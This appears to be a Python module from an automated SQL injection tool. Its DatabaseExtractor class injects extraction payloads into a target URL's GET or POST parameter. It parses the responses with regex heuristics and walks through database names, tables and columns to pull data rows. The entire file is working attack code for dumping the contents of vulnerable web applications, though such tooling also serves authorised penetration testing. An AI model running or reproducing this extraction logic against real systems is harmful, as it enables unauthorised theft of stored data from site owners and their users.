#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Database information extraction module
"""

import re
from ..utils.http_utils import inject_payload_in_url
from ..utils.cli import print_status
from ..payloads.sql_payloads import EXTRACTION_PAYLOADS


class DatabaseExtractor:
    """Class to extract database information when vulnerabilities are found"""

    def __init__(self, url, parameter, db_type, request_handler, logger, vuln_logger=None, is_post=False, data=None):
        """
        Initialize database extractor

        Args:
            url (str): Target URL
            parameter (str): Vulnerable parameter
            db_type (str): Database type
            request_handler (RequestHandler): HTTP request handler instance
            logger (logging.Logger): Logger instance
            vuln_logger (VulnerabilityLogger, optional): Vulnerability logger
            is_post (bool): Whether to use POST requests
            data (dict, optional): POST data
        """
        self.url = url
        self.parameter = parameter
        self.db_type = db_type.lower() if db_type else "unknown"
        self.request_handler = request_handler
        self.logger = logger
        self.vuln_logger = vuln_logger
        self.is_post = is_post
        self.data = data

        # Get appropriate extraction payloads
        if self.db_type == "mysql":
            self.extraction_payloads = EXTRACTION_PAYLOADS['mysql']
        elif self.db_type == "mssql":
            self.extraction_payloads = EXTRACTION_PAYLOADS['mssql']
        elif self.db_type in ["postgresql", "postgres"]:
            self.extraction_payloads = EXTRACTION_PAYLOADS['postgres']
        elif self.db_type == "oracle":
            self.extraction_payloads = EXTRACTION_PAYLOADS['oracle']
        elif self.db_type == "sqlite":
            self.extraction_payloads = EXTRACTION_PAYLOADS['sqlite']
        else:
            # Default to MySQL if unknown
            self.extraction_payloads = EXTRACTION_PAYLOADS['mysql']

    def extract_content(self, payload):
        """
        Extract content from a payload injection

        Args:
            payload (str): SQL payload to inject

        Returns:
            str: Extracted content or None if not found
        """
        try:
            if self.is_post:
                # Modify POST data
                test_data = self.data.copy()
                test_data[self.parameter] = payload

                # Send POST request
                response = self.request_handler.post(self.url, data=test_data)
            else:
                # Inject payload into URL parameter
                test_url = inject_payload_in_url(
                    self.url, self.parameter, payload)

                # Send GET request
                response = self.request_handler.get(test_url)

            # Extract content from response
            # Look for common patterns in the response that might contain the extracted data

            # Try to find data between tags (often databases output data in HTML tags)
            tag_pattern = re.compile(r'<[^>]+>(.*?)</[^>]+>', re.DOTALL)
            tag_matches = tag_pattern.findall(response.text)

            # Try to find data in "visible" parts of the response
            # This is a simple heuristic to extract text that might be displayed to users
            for match in tag_matches:
                # Clean up the match
                match = match.strip()
                if match and not re.match(r'^[\s\n\r]*$', match):
                    return match

            # Try to find data based on specific patterns for database outputs
            db_output_patterns = [
                # Pattern for column data (number sequences)
                r'(\d+)[\s,]+(\d+)[\s,]+(\d+)',

                # Pattern for database names, table names, etc.
                r'([a-zA-Z0-9_]+)[\s,]+([a-zA-Z0-9_]+)[\s,]+([a-zA-Z0-9_]+)',

                # Pattern for version information
                r'([\w\-\. ]+?)\s*?(\d+\.\d+[\.\d]*)',
            ]

            for pattern in db_output_patterns:
                matches = re.findall(pattern, response.text)
                if matches:
                    return str(matches[0])

            # If no patterns matched, return a part of the response
            # This is a fallback in case our patterns don't match
            if len(response.text) > 1000:
                return response.text[:1000] + "..."
            else:
                return response.text

        except Exception as e:
            self.logger.error(
                f"Error extracting content with payload {payload}: {str(e)}")
            return None

    def extract_databases(self):
        """
        Extract database names

        Returns:
            list: List of database names
        """
        self.logger.info("Extracting database names")
        print_status("Extracting database names...", "info")

        databases = []

        for payload in self.extraction_payloads['databases']:
            result = self.extract_content(payload)
            if result:
                self.logger.info(f"Found databases: {result}")
                print_status(f"Found databases: {result}", "success")
                databases.append(result)
                break

        return databases

    def extract_tables(self, database=None):
        """
        Extract table names from a database

        Args:
            database (str, optional): Database name to extract tables from

        Returns:
            list: List of table names
        """
        self.logger.info(
            f"Extracting tables from database {database if database else 'current'}")
        print_status(
            f"Extracting tables from database {database if database else 'current'}...", "info")

        tables = []

        for payload in self.extraction_payloads['tables']:
            # Format payload with database name if provided
            formatted_payload = payload.format(
                database) if database and '{}' in payload else payload

            result = self.extract_content(formatted_payload)
            if result:
                self.logger.info(f"Found tables: {result}")
                print_status(f"Found tables: {result}", "success")
                tables.append(result)
                break

        return tables

    def extract_columns(self, table):
        """
        Extract column names from a table

        Args:
            table (str): Table name to extract columns from

        Returns:
            list: List of column names
        """
        if not table:
            return []

        self.logger.info(f"Extracting columns from table {table}")
        print_status(f"Extracting columns from table {table}...", "info")

        columns = []

        for payload in self.extraction_payloads['columns']:
            # Format payload with table name
            formatted_payload = payload.format(table)

            result = self.extract_content(formatted_payload)
            if result:
                self.logger.info(f"Found columns: {result}")
                print_status(f"Found columns: {result}", "success")
                columns.append(result)
                break

        return columns

    def extract_data(self, table, columns):
        """
        Extract data from a table

        Args:
            table (str): Table name to extract data from
            columns (str): Comma-separated list of columns to extract

        Returns:
            list: List of data rows
        """
        if not table or not columns:
            return []

        self.logger.info(
            f"Extracting data from table {table}, columns {columns}")
        print_status(
            f"Extracting data from table {table}, columns {columns}...", "info")

        data = []

        for payload in self.extraction_payloads['data']:
            # Format payload with columns and table
            formatted_payload = payload.format(columns, table)

            result = self.extract_content(formatted_payload)
            if result:
                self.logger.info(f"Found data: {result}")
                print_status(f"Found data: {result}", "success")
                data.append(result)
                break

        return data

    def extract_all(self):
        """
        Extract all available database information

        Returns:
            dict: Dictionary containing extracted information
        """
        extraction_results = {
            'databases': [],
            'tables': {},
            'columns': {},
            'data': {}
        }

        # Extract databases
        databases = self.extract_databases()
        extraction_results['databases'] = databases

        # Extract tables from each database
        # Limit to first 2 databases to avoid too many requests
        for database in databases[:2]:
            tables = self.extract_tables(database)
            extraction_results['tables'][database] = tables

            # Extract columns from each table
            for table in tables[:3]:  # Limit to first 3 tables
                columns = self.extract_columns(table)
                extraction_results['columns'][table] = columns

                # Extract data from each table
                if columns:
                    # Use first 3 columns at most
                    columns_to_extract = ','.join(columns[:3]) if isinstance(
                        columns[0], list) else columns[0]
                    data = self.extract_data(table, columns_to_extract)
                    extraction_results['data'][table] = data

        # Log the results
        self.logger.info(f"Extraction results: {extraction_results}")

        # Add to vulnerability logger if available
        if self.vuln_logger:
            for vuln in self.vuln_logger.vulnerabilities:
                if vuln['parameter'] == self.parameter and vuln['url'] == self.url:
                    vuln['details']['extraction_results'] = extraction_results

        return extraction_results
